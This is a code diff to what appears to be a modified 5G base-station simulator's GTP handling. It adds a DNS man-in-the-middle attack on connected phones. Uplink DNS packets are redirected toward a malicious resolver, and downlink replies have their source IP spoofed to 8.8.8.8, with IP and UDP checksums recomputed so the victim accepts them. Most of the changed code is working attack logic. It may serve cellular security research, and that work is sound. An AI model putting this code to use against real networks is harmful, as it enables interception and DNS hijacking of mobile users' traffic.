@@ -132,7 +132,7 @@ void GtpTask::handleUplinkData(int ueId, int psi, OctetString &&pdu)
 
     if (std::string(inet_ntoa(src_ip_addr)) != "0.0.0.0" && (int)p.ip->iph_protocol == 17 && (int)(ntohs(p.udp->udph_destport)) == 53)
     {
-        m_logger->debug("DNS packet received from UE[%d], performing MiTM attack!", ueId);
+        m_logger->debug("UL DNS packet received from UE[%d], performing MiTM attack!", ueId);
 
         // MiTM attack
         // TODO: command line defined malicious DNS server IP
@@ -142,8 +142,11 @@ void GtpTask::handleUplinkData(int ueId, int psi, OctetString &&pdu)
 
         // Fix integrity checks
         // For DNS, we need to fix IP and UDP checksums
-        m_logger->debug("Applying checksums to packet");
-        utils::apply_checksums(&p, pdu.length());
+        m_logger->debug("Applying checksums [IP, UDP] to packet");
+        utils::compute_ip_checksum(&p);
+        utils::compute_udp_checksum(&p, pdu.length());
+
+        m_logger->debug("UL MiTM attack completed, forwarding packet");
     }
 
     // ignore non IPv4 packets
@@ -182,7 +185,6 @@ void GtpTask::handleUplinkData(int ueId, int psi, OctetString &&pdu)
             m_logger->err("Uplink data failure, GTP encoding failed");
         else
         {
-            m_logger->debug("Sending GTP PDU");
             m_udpServer->send(InetAddress(pduSession->upTunnel.address, cons::GtpPort), gtpPdu);
         }
     }
@@ -217,31 +219,26 @@ void GtpTask::handleUdpReceive(const udp::NwUdpServerReceive &msg)
 
         const uint8_t *data = w->data.data();
 
-        // print the uint_8 array
-        printf("Original Incoming GTP Payload: \n");
-        for (int i = 0; i < w->data.length(); i++)
-            printf("%02x ", data[i]);
-        printf("\n");
-
-        // Set the original source IP to trick the recipient into believing the reply
-        // is from the desired IP
-        printf("Parsing incoming packet\n");
         utils::packet p = utils::parse_packet(data);
-        printf("Parse complete\n");
         struct in_addr src_ip_addr;
         src_ip_addr.s_addr = p.ip->iph_sourceip;
-        printf("Packet source IP before modification: %s\n", inet_ntoa(src_ip_addr));
-        utils::set_source_ip(&p, "8.8.8.8");
-        src_ip_addr.s_addr = p.ip->iph_sourceip;
-        printf("Packet source IP after modification: %s\n", inet_ntoa(src_ip_addr));
-        utils::apply_checksums(&p, w->data.length());
 
-        // print the uint_8 array
-        printf("Modified Incoming GTP Payload: \n");
-        for (int i = 0; i < w->data.length(); i++)
-            printf("%02x ", data[i]);
-        printf("\n");
+        if (std::string(inet_ntoa(src_ip_addr)) != "0.0.0.0" && (int)p.ip->iph_protocol == 17 && (int)(ntohs(p.udp->udph_srcport)) == 53){
+            m_logger->debug("DL DNS packet received from UE[%d], performing MiTM attack!", w->ueId);
 
+            // MiTM attack
+            // TODO: store original Ip somehwere for a given UL packet to be used in DL later
+            std::string orig_dns_ip = "8.8.8.8";
+            utils::set_source_ip(&p, orig_dns_ip);
+
+            // Fix integrity checks
+            // For DNS, we need to fix IP and UDP checksums
+            m_logger->debug("Applying checksums [IP, UDP] to packet");
+            utils::compute_ip_checksum(&p);
+            utils::compute_udp_checksum(&p, w->data.length());
+
+            m_logger->debug("DL MiTM attack completed, forwarding packet");
+        }
         m_base->mrTask->push(w);
     }
 
